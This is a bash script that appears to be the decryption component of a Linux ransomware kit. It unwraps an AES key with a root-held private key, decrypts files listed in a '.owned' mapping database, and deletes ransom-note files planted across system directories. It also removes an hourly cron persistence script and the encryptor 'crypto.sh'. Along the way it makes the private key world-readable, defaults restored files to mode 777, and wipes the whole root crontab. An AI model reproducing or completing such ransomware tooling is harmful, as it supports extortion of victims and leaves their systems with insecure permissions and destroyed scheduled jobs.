#!/bin/bash

# Check if the Private key is in /root
if [ ! -f /root/priv.pem ]
then
  echo -e "Please ensure that the private key is in the root directory (priv.pem)\n"
  exit 1
fi

# Set the permissions on /root/priv.pem
chmod 755 /root/priv.pem

# Decrypt the Key file with the Private key
openssl rsautl -decrypt -inkey /root/priv.pem -in /root/key.bin.enc -out /root/key.bin

# Decrypt the File Mapping file
openssl enc -aes-256-cbc -d -in "/root/..file_mapping.db.owned" -out "/root/..file_mapping.db" -pass file:/root/key.bin

# Get the Mapping Values, then decrypt and set the original permissions
for file in $(cat /root/..file_mapping.db)
do
  filePerms=$(echo "${file}" | awk -F"," '{ print $3 }')
  encFile=$(echo "${file}" | awk -F"," '{ print $2 }')
  origFile=$(echo "${file}" | awk -F"," '{ print $1 }')

  openssl enc -aes-256-cbc -d -in "${encFile}" -out "${origFile}" -pass file:/root/key.bin

  if [ "${filePerms}" == "" ]
  then
    filePerms="777"

    chmod "${filePerms}" "${origFile}"
  else
    chmod "${filePerms}" "${origFile}"
  fi

  rm -rf "${encFile}"
done

# Remove the Instruction Documents
for directory in $(find /root/ /home/ /etc/ /bin/ /usr/sbin/ /usr/bin /sbin/ /usr/local/bin/ -type d)
do
    rm -rf "${directory}/INSTRUCTIONS.txt"
    rm -rf "${directory}/INSTRUCTIONS.hmtl"
done

crontab -r 
rm -rf /etc/cron.hourly/instructions.sh
rm -rf /root/..file_mapping.db /root/..file_mapping.db.owned
rm -rf /root/key.bin /root/key.bin.enc /root/priv.pem /root/pub.pem /root/crypto.sh
